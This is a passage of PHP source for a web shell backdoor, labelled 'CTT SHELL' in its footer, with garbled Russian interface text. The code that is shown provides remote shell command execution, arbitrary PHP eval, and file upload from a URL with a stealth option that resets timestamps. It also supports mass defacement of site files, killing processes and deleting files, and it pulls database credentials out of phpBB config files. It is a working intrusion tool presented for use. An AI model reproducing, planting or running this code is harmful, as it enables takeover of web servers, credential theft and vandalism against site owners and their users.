  echo "<center><b>Èçìåíåíèå Àòðèáóò Ôàéëà</b><br>";
  $perms = view_perms(fileperms($d.$f));
  $length = strlen($perms);
  $owner_r = $owner_w = $owner_x =
  $group_r = $group_w = $group_x = 
  $world_r = $world_w = $group_x = "";

  if ($perms[1] == "r") {$owner_r = " checked";} if ($perms[2] == "w") {$owner_w = " checked";}
  if ($perms[3] == "x") {$owner_x = " checked";} if ($perms[4] == "r") {$group_r = " checked";}
  if ($perms[5] == "w") {$group_w = " checked";} if ($perms[6] == "x") {$group_x = " checked";}
  if ($perms[7] == "r") {$world_r = " checked";} if ($perms[8] == "w") {$world_w = " checked";}
 if ($perms[9] == "x") {$world_x = " checked";}
  echo "<form method=\"POST\"><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value='".htmlspecialchars($f)."'>
<input type=hidden name=act value=chmod><input type=hidden name=submit value=1><input type=hidden name='owner[3]' value=no_error>
<input type=hidden name='group[3]' value=no_error><input type=hidden name='world[3]' value=no_error>
<table class=table1><tr><td class=td2><table class=table1 align=center width=300 border=0 cellspacing=0 cellpadding=5><tr><td class=td2><b>Owner</b><br><br>
<input type=checkbox NAME=owner[0] value=4".$owner_r.">Read<br><input type=checkbox NAME=owner[1] value=2".$owner_w.">Write<br>
<input type=checkbox NAME=owner[2] value=1".$owner_x.">Execute</font></td><td class=td2><b>Group</b><br><br>
<input type=checkbox NAME=group[0] value=4".$group_r.">Read<br>
<input type=checkbox NAME=group[1] value=2".$group_w.">Write<br>
<input type=checkbox NAME=group[2] value=1".$group_x.">Execute</font></td>
<td class=td2><b>World</b><br><br><input type=checkbox NAME=world[0] value=4".$world_r.">Read<br>
<input type=checkbox NAME=world[1] value=2".$world_w.">Write<br>
<input type=checkbox NAME=world[2] value=1".$world_x.">Execute</font></td>
</tr></table></td></tr><tr align=center><td><input type=submit name=chmod value=\"Ñîõðàíèòü\"></td></tr></table></FORM></center>";
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\\","/",$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,strlen($uploadpath)-1,1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile[tmp_name]))
  {
if (empty($uploadfilename)) {$destin = $uploadfile[name];}
else {$destin = $userfilename;}
if (!move_uploaded_file($uploadfile[tmp_name],$uploadpath.$destin)) {$uploadmess .= "Îøèáêà, çàãðóæàþùàÿ ôàéë ".$uploadfile[name]." (íå ìîæåò ñêîïèðîâàòü \"".$uploadfile[tmp_name]."\" íà \"".$uploadpath.$destin."\"!<br>";}
  }
  elseif (!empty($uploadurl))
  {
if (!empty($uploadfilename)) {$destin = $uploadfilename;}
else
{
 $destin = explode("/",$destin);
 $destin = $destin[count($destin)-1];
 if (empty($destin))
 {
  $i = 0;
  $b = "";
  while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
}
if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
else
{
 $st = getmicrotime();
 $content = @file_get_contents($uploadurl);
 $dt = round(getmicrotime()-$st,4);
 if (!$content) {$uploadmess .=  "Íå ìîæåò çàãðóçèòü ôàéë!<br>";}
 else
 {
  if ($filestealth) {$stat = stat($uploadpath.$destin);}
  $fp = fopen($uploadpath.$destin,"w");
  if (!$fp) {$uploadmess .= "Îøèáêà, ïèøóùàÿ ôàéëó ".htmlspecialchars($destin)."!<br>";}
  else
  {
fwrite($fp,$content,strlen($content));
fclose($fp);
if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
  }
 }
}
  }
 }
 if ($miniform)
 {
  echo "<b>".$uploadmess."</b>";
  $act = "ls";
 }
 else
 {
  echo "<b>Çàãðóçêà Ôàéëà:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$sul."act=upload&d=".urlencode($d)."\" method=\"POST\">
Ëîêàëüíûé ôàéë: <br><input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;èëè<br>
Çàãðóçèòü èç URL: <br><input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
Ñîõðàíèòü ýòîò ôàéëü â ïàïêó: <br><input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
Èìÿ Ôàéëà: <br><input name=uploadfilename size=25>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;Êîíâåðòèðîâàòü èìÿ ôàéëà<br><br>
<input type=\"submit\" name=\"submit\" value=\"Çàãðóçèòü\">
</form>";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = false;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Íå ìîæåò óäàëèòü ".htmlspecialchars($v)."<br>";}
  if (!empty($delerr)) {echo "<b>Óäàëåíèå ñ îøèáêàìè:</b><br>".$delerr;}
 }
 $act = "ls";
}
if ($act == "onedelete")
{
 $delerr = "";
  $result = false;
  $result = fs_rmobj($f);
  if (!$result) {$delerr .= "Íå ìîæåò óäàëèòü ".htmlspecialchars($f)."<br>";}
  if (!empty($delerr)) {echo "<b>Óäàëåíèå ñ îøèáêàìè:</b><br>".$delerr;}
 $act = "ls";
}
if ($act == "onedeleted")
{
 $delerr = "";
  $result = false;
  $result = fs_rmobj($d+'/'+$f);
  if (!$result) {$delerr .= "Íå ìîæåò óäàëèòü ".htmlspecialchars($f)."<br>";}
  if (!empty($delerr)) {echo "<b>Óäàëåíèå ñ îøèáêàìè:</b><br>".$delerr;}
 $act = "ls";
}
if ($act == "deface")
{
 $deferr = "";
 foreach ($actbox as $v)
 {
  $data = $deface_html;
  if (eregi("%%%filedata%%%",$data)) {$data = str_replace("%%%filedata%%%",file_get_contents($v),$data);}
  $data = str_replace("%%%filename%%%",basename($v),$data);
  $data = str_replace("%%%filepath%%%",$v,$data);
  $fp = @fopen($v,"w");
  fwrite($fp,$data);
  fclose($fp);
  if (!$result) {$deferr .= "Can't deface ".htmlspecialchars($v)."<br>";}
  if (!empty($delerr)) {echo "<b>Defacing with errors:</b><br>".$deferr;}
 }
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"USEFSBUFF\" as TRUE.</center>";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); ct_sess_put($sess_data); $act = "ls";}
 if ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); ct_sess_put($sess_data); $act = "ls";}
 if ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} $ls_arr = array_merge($sess_data["copy"],$sess_data["cut"]); ct_sess_put($sess_data); $act = "ls";}
 
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); ct_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
$to = $d.basename($v);
if (!fs_copy_obj($v,$d)) {$psterr .= "Íå ìîæåò ñêîïèðîâàòü ".$v." to ".$to."!<br>";}
if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
$to = $d.basename($v);
if (!fs_move_obj($v,$d)) {$psterr .= "Íå ìîæåò ïåðåìåñòèòüñÿ ".$v." to ".$to."!<br>";}
unset($sess_data["cut"][$k]);
  }
  ct_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Ïðèêëåèâàíèå ñ îøèáêàìè:</b><br>".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  
  if ($ext == ".tar.gz")
  {
$cmdline = "tar cfzv";
  }
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
$v = str_replace("\\","/",$v);
if (is_dir($v))
{
 if (substr($v,strlen($v)-1,strlen($v)) != "/") {$v .= "/";}
 $v .= "*";
}
$cmdline .= " ".$v;
  }
  $ret = `$cmdline`;
  if (empty($ret)) {$arcerr .= "Íå ìîæåò íàçâàòü archivator!<br>";}
  $ret = str_replace("\r\n","\n");
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=>$v)
  {
if (in_array($v,$ret)) {fs_rmobj($v);}
unset($sess_data["cut"][$k]);
  }
  ct_sess_put($sess_data);
  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
$to = $d.basename($v);
if (!fs_copy_obj($v,$d)) {$psterr .= "Íå ìîæåò ñêîïèðîâàòü ".$v." to ".$to."!<br>";}
if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
$to = $d.basename($v);
if (!fs_move_obj($v,$d)) {$psterr .= "Íå ìîæåò ïåðåìåñòèòüñÿ ".$v." to ".$to."!<br>";}
unset($sess_data["cut"][$k]);
  }
  ct_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Ïðèêëåèâàíèå ñ îøèáêàìè:</b><br>".$psterr;}
  $act = "ls";
 }
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
while ($o = readdir($h)) {$list[] = $d.$o;}
closedir($h);
  }
 }
 if (count($list) == 0) {echo "<center><b>Íå ìîæåò îòêðûòü ñïðàâî÷íèê (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  $tab = array();
  $amount = count($ld)+count($lf);
  $vd = "f"; 
  if ($vd == "f")
  {
$row = array();
$row[] = "<b><center>Èìÿ</b>";
$row[] = "<b><center>Ðàçìåð</center></b>";
$row[] = "<b><center>Èçìåíåí</center></b>";
if (!$win)
  {$row[] = "<b><center>Âëàäåëåö/Ãðóïïà</center></b>";}
$row[] = "<b><center>Ïðàâà</center></b>";
$row[] = "<b><center>Ôóíêöèè</center></b>";

$k = $sort[0];
if ((!is_numeric($k)) or ($k > count($row)-2)) {$k = 0;}
if (empty($sort[1])) {$sort[1] = "d";}
if ($sort[1] != "a")
{
 $y = "<a href=\"".$sul."act=".$dspact."&d=".urlencode($d)."&sort=".$k."a\"><img src=\"".$sul."act=img&img=sort_desc\" border=\"0\"></a></center>";
}
else
{
 $y = "<a href=\"".$sul."act=".$dspact."&d=".urlencode($d)."&sort=".$k."d\"><img src=\"".$sul."act=img&img=sort_asc\" border=\"0\"></a></center>";
}

$row[$k] .= $y;
for($i=0;$i<count($row)-1;$i++)
{
 if ($i != $k) {$row[$i] = "<a href=\"".$sul."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$sort[1]."\">".$row[$i]."</a>";}
}

$tab = array();
$tab[cols] = array($row);
$tab[head] = array();
$tab[dirs] = array();
$tab[links] = array();
$tab[files] = array();

foreach ($list as $v)
{
 $o = basename($v);
 $dir = dirname($v);
  
 if ($disp_fullpath) {$disppath = $v;}
 else {$disppath = $o;}
 $disppath = str2mini($disppath,60);
  
 if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
 elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}

 $uo = urlencode($o);
 $ud = urlencode($dir);
 $uv = urlencode($v);

 $row = array();

if (is_dir($v))
 {
  if (is_link($v)) {$disppath .= " => ".readlink($v); $type = "LINK";}
  else {$type = "DIR";}
  $row[] =  "<a href=\"".$sul."act=ls&d=".$uv."&sort=".$sort."\"> <img src=\"".$sul."act=img&img=small_dir\" height=\"16\" width=\"16\" border=\"0\">&nbsp; ".$disppath."</a>";
  $row[] = $type;
 }
 elseif(is_file($v))
 {
  $ext = explode(".",$o);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $row[] =  "<a href=\"".$sul."act=f&f=".$uo."&d=".$ud."&\"><img src=\"".$sul."act=img&img=ext_".$ext."\" height=\"16\" width=\"16\" border=\"0\">&nbsp; ".$disppath."</a>";
  $row[] = view_size(filesize($v));
 }
 $row[] = "<center>".date("d.m.Y H:i:s",filemtime($v))."</center>";
  
 if (!$win)
 {
  $ow = @posix_getpwuid(fileowner($v));
  $gr = @posix_getgrgid(filegroup($v));
  $row[] = "<center>".$ow["name"]."/".$gr["name"]."</center>";
 }

 if (is_writable($v)) {$row[] = "<a href=\"".$sul."act=chmod&f=".$uo."&d=".$ud."\">".view_perms(fileperms($v))."</a>";}
 else {$row[] = "<a href=\"".$sul."act=chmod&f=".$uo."&d=".$ud."\"><font color=\"red\">".view_perms(fileperms($v))."</font></a>";}

 if (is_dir($v)) {$row[] = "&nbsp;<input type=\"checkbox\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\">&nbsp;<a href=\"".$sul."act=onedeleted&f=".$uo."&d=".$ud."\"><img src=\"".$sul."act=img&img=odel\" title=\"Delete\" height=\"16\" width=\"19\" border=\"0\"></a>";}
 else {$row[] = "&nbsp;<input type=\"checkbox\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\">&nbsp;<a href=\"".$sul."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$sul."act=img&img=change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$sul."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$sul."act=img&img=download\" title=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$sul."act=onedelete&f=".$uo."&d=".$ud."\"><img src=\"".$sul."act=img&img=odel\" title=\"Delete\" height=\"16\" width=\"19\" border=\"0\"></a>";}

 if (($o == ".") or ($o == "..")) {$tab[head][] = $row;}
 elseif (is_link($v)) {$tab[links][] = $row;}
 elseif (is_dir($v)) {$tab[dirs][] = $row;}
 elseif (is_file($v)) {$tab[files][] = $row;}
}
  }
  $v = $sort[0];
  function tabsort($a, $b)
  {
global $v;
return strnatcasecmp(strip_tags($a[$v]), strip_tags($b[$v]));
  }
  usort($tab[dirs], "tabsort");
  usort($tab[files], "tabsort");
  if ($sort[1] == "a")
  {
$tab[dirs] = array_reverse($tab[dirs]);
$tab[files] = array_reverse($tab[files]);
  }
  $table = array_merge($tab[cols],$tab[head],$tab[dirs],$tab[links],$tab[files]);
  echo "<TABLE class=table1  cellSpacing=0 cellPadding=0 width=100% border=0>
<form method=\"POST\">";
$smsn=0;
  foreach($table as $row)
  {
$smsn++;
 if ($smsn!=2 && $smsn!=3) { 
echo "<tr>\r\n";
foreach($row as $v) {echo "<td class=tds1 bgcolor=#242424>".$v."</td>\r\n";}
echo "</tr>\r\n";
}

  }
  echo "</table><TABLE height=1% class=table2 cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#333333 border=0>
<tr class=tr2>
<td width=8% height=1%><font size=2 color=#000000>
Ïàïêè: ".(count($tab[dirs])+count($tab[links]))."</font></td>
<td width=8% height=1%><font size=2 color=#000000> Ôàéëû: ".count($tab[files])."</font></td><td height=1% vAlign=top align=right>";
if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
  {
echo "<input type=\"submit\" name=\"actarcbuff\" value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"actpastebuff\" value=\"Âñòàâèòü\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"actemptybuff\" value=\"Ïóñòîé áóôåð\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "<select name=\"act\"><option value=\"".$act."\">Ñ îòîáðàííûì:</option>";
  echo "<option value=\"delete\"".gchds($dspact,"delete"," selected").">Óäàëèòü</option>";
  if ($usefsbuff)
  {
echo "<option value=\"cut\"".gchds($dspact,"cut"," selected").">Âûðàçàòü</option>";
echo "<option value=\"copy\"".gchds($dspact,"copy"," selected").">Êîïèðîâàòü</option>";
echo "<option value=\"unselect\"".gchds($dspact,"unselect"," selected").">Íåâûáðàòü</option>";
  }
  if ($dspact == "massdeface") {echo "<option value=\"deface\"".gchds($dspact,"deface"," selected").">Íåâûáðàòü</option>";}
  echo "</select>&nbsp;<input type=\"submit\" value=\"Ïîäòâåðäèòü\">";
  echo "</form>";

echo "</td></tr></table>";
echo "</td></tr></table><br><center><font size=2 color=#aaaaaa>[<a href=http://ctt.void.ru>CTT</a>] SHELL ver ".$shver."</font></center>";
 }

}
if ($act == "cmd")
{
 if (!empty($submit))
 {
  echo "<b>Ðåçóëüòàò âûïîëíåíèÿ ýòà êîìàíäà</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
ob_clean();
myshellexec($cmd);
$ret = ob_get_contents();
$ret = convert_cyr_string($ret,"d","w");
ob_clean();
echo $tmp;
if ($cmd_txt)
{
 $rows = count(explode("
",$ret))+1;
 if ($rows < 10) {$rows = 10;}
 echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
}
else {echo $ret;}
  }
  else
  {
if ($cmd_txt)
{
 echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
 myshellexec($cmd);
 echo "</textarea>";
}
else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Êîìàíäà âûïîëíåíèÿ:</b>";  if (empty($cmd_txt)) {$cmd_txt = true;}}
 echo "<form action=\"".$sul."act=cmd\" method=\"POST\"><textarea name=\"cmd\" cols=\"122\" rows=\"10\">".htmlspecialchars($cmd)."</textarea><input type=\"hidden\" name=\"d\" value=\"".$dispd."\"><br><br><input type=\"submit\" name=\"submit\" value=\"Âûïîëíèòü\"><input type=\"hidden\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
if ($act == "ps_aux")
{
 echo "<b>Ïðîöåññû:</b><br>";
 if ($win) {
echo "<pre>";
system('tasklist');
echo "</pre>";
}
 else
 {
  if ($pid)
  {
if (!$sig) {$sig = 9;}
echo "Sending signal ".$sig." to #".$pid."... ";
$ret = posix_kill($pid,$sig);
if ($ret) {echo "ok. he is dead, amen.";}
else {echo "ERROR. Can't send signal ".htmlspecialchars($sig).", to process #".htmlspecialchars($pid).".";}
  }
  $ret = `ps -aux`;
  if (!$ret) {echo "Can't execute \"ps -aux\"!";}
  else
  {
$ret = htmlspecialchars($ret);
$ret = str_replace(""," ",$ret);
while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
$prcs = explode("\n",$ret);
$head = explode(" ",$prcs[0]);
$head[] = "ACTION";
unset($prcs[0]);
echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
echo "<tr border=\"1\">";
foreach ($head as $v) {echo "<td><b>&nbsp;&nbsp;&nbsp;".$v."</b>&nbsp;&nbsp;&nbsp;</td>";}
echo "</tr>";
foreach ($prcs as $line)
{
 if (!empty($line))
 {
  echo "<tr>";
  $line = explode(" ",$line);
  $line[10] = join(" ",array_slice($line,10,count($line)));
  $line = array_slice($line,0,11);
  $line[] = "<a href=\"".$sul."act=ps_aux&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
  foreach ($line as $v) {echo "<td>&nbsp;&nbsp;&nbsp;".$v."&nbsp;&nbsp;&nbsp;</td>";}
  echo "</tr>";
 }
}
echo "</table>";
  }
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Ðåçóëüòàò âûïîëíåíèÿ ýòîò PHP-êîä</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
ob_clean();
eval($eval);
$ret = ob_get_contents();
$ret = convert_cyr_string($ret,"d","w");
ob_clean();
echo $tmp;
if ($eval_txt)
{
 $rows = count(explode("
",$ret))+1;
 if ($rows < 10) {$rows = 10;}
 echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
}
else {echo $ret;}
  }
  else
  {
if ($eval_txt)
{
 echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
 eval($eval);
 echo "</textarea>";
}
else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>PHP-êîä âûïîëíåíèÿ</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
 echo "<form method=\"POST\"><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=\"hidden\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "><input type=\"hidden\" name=\"d\" value=\"".$dispd."\"><br><br><input type=\"submit\" value=\"Âûïîëíèòü\"></form>";
}
if ($act == "f")
{
 $r = @file_get_contents($d.$f);
 if (!is_readable($d.$f) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$sul."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
 }
 else
 {
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=>$v)
  {
if (in_array($ext,$v)) {$rft = $k; break;}
  }
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}

  echo "<b>Ðàññìîòðåíèå ôàéëà:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$sul."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  if (is_writable($d.$f)) {echo "<font color=\"green\">Ïîëíûé äîñòóï ÷òåíèÿ/çàïèñè (".view_perms(fileperms($d.$f)).")</font>";}
  else {echo "<font color=\"red\">Read-Only (".view_perms(fileperms($d.$f)).")</font>";}
 
  echo "<hr size=\"1\" noshade>";
  if ($ft == "info")
  {
echo "<b>Information:</b>";
echo "<table class=tab border=0 cellspacing=1 cellpadding=2>";
echo "<tr class=tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr>";
echo "<tr class=tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
if (!$win)
{
 echo "<tr class=tr><td><b>Owner/Group</b></td><td> ";
 $tmp=posix_getpwuid(fileowner($d.$f));
 if (!isset($tmp['name']) || $tmp['name']=="") echo fileowner($d.$f)." ";
 else echo $tmp['name']." ";
 $tmp=posix_getgrgid(filegroup($d.$f));
 if (!isset($tmp['name']) || $tmp['name']=="") echo filegroup($d.$f);
 else echo $tmp['name'];
}
echo "<tr class=tr><td><b>Perms</b></td><td>";

if (is_writable($d.$f))
{
 echo "<font color=\"green\">".view_perms(fileperms($d.$f))."</font>";
}
else
{
 echo "<font>".view_perms(fileperms($d.$f))."</font>";
}

echo "</td></tr>";
echo "<tr class=tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr>";
echo "<tr class=tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr>";
echo "<tr class=tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr>";
echo "</table><br>";


$fi = fopen($d.$f,"rb");
if ($fi)
{
 if ($fullhexdump)
 {
  echo "<b>FULL HEXDUMP</b>";
  $str=fread($fi,filesize($d.$f));
 }
 else
 {
  echo "<b>HEXDUMP PREVIEW</b>";
  $str=fread($fi,$hexdump_lines*$hexdump_rows);
 }
 $n=0;
 $a0="00000000<br>";
 $a1="";
 $a2="";
 for ($i=0; $i<strlen($str); $i++)
 {
  $a1.=sprintf("%02X",ord($str[$i])).' ';
  switch (ord($str[$i]))
  {
case 0:  $a2.="<font class=s2>0</font>"; break;
case 32: 
case 10:
case 13: $a2.="&nbsp;"; break;
default:  $a2.=htmlspecialchars($str[$i]);
  }
  $n++;
  if ($n == $hexdump_rows)
  {
$n = 0;
if ($i+1<strlen($str)) {$a0.=sprintf("%08X",$i+1)."<br>";}
$a1.="<br>";
$a2.="<br>";
  }
 }
 echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4 ".
"class=sy><tr><td bgcolor=#666666> $a0</td><td bgcolor=000000>".
"$a1</td><td bgcolor=000000>$a2</td></tr></table><br>";
}
$encoded = "";
if ($base64 == 1)
{
 echo "<b>Base64 Encode</b><br>";
 $encoded = base64_encode($r);
}
elseif($base64 == 2)
{
 echo "<b>Base64 Encode + Chunk</b><br>";
 $encoded = chunk_split(base64_encode($r));
}
elseif($base64 == 3)
{
 echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
 $encoded = base64_encode($r);
 $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
}
elseif($base64 == 4)
{
}
if (!empty($encoded))
{
 echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
}
echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
<nobr>[<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$sul."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
<P>";
  }
  elseif ($ft == "html")
  {
if ($white) {@ob_clean();}
echo $r;
if ($white) {exit;}
  }
  elseif ($ft == "txt")
  {
echo "<pre>".htmlspecialchars($r)."</pre>";
  }
  elseif ($ft == "ini")
  {
echo "<pre>";
var_dump(parse_ini_file($d.$f,true));
echo "</pre>";
  }
  elseif ($ft == "phpsess")
  {
echo "<pre>";
$v = explode("|",$r);
echo $v[0]."<br>";
var_dump(unserialize($v[1]));
echo "</pre>";
  }
  elseif ($ft == "exe")
  {
echo "<form action=\"".$sul."act=cmd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"".htmlspecialchars($r)."\"><input type=\"submit\" name=\"submit\" value=\"Execute\">&nbsp;<input type=\"submit\" value=\"View&Edit command\"></form>";
  }
  elseif ($ft == "sdb")
  {
echo "<pre>";
var_dump(unserialize(base64_decode($r)));
echo "</pre>";
  }
  elseif ($ft == "code")
  {
if (ereg("phpBB 2.(.*) auto-generated config file",$r))
{
 $arr = explode("
",$r);
 if (count($arr == 18))
 {
  include($d.$f);
  echo "<b>phpBB configuration is detected in this file!<br>";
  if ($dbms == "mysql4") {$dbms = "mysql";}
  if ($dbms == "mysql") {echo "<a href=\"".$sul."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."\"><b><u>Connect to DB</u></b></a><br><br>";}
  else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by ctshell";}
  echo "Parameters for manual connect:<br>";
  $cfgvars = array(
  "dbms"=>$dbms,
  "dbhost"=>$dbhost,
  "dbname"=>$dbname,
  "dbuser"=>$dbuser,
  "dbpasswd"=>$dbpasswd 
  );
  foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
 
  echo "</b>";
  echo "<hr size=\"1\" noshade>";
 }
}
echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #808080;\">";
if (!empty($white)) {@ob_clean();}
if ($rehtml) {$r = rehtmlspecialchars($r);} 
$r = stripslashes($r); 
$strip = false;
if(!strpos($r,"<?") && substr($r,0,2)!="<?") {$r="<?php\n".trim($r)."\n?>"; $r = trim($r); $strip = true;}
$r = @highlight_string($r, TRUE); 
if ($delspace) {$buffer = str_replace ("&nbsp;", " ", $r);}
echo $r;
if (!empty($white)) {exit;}
echo "</div>";
  }
  elseif ($ft == "download")
  {
@ob_clean();
header("Content-type: ctshell");
header("Content-disposition: attachment; filename=\"".$f."\";"); 
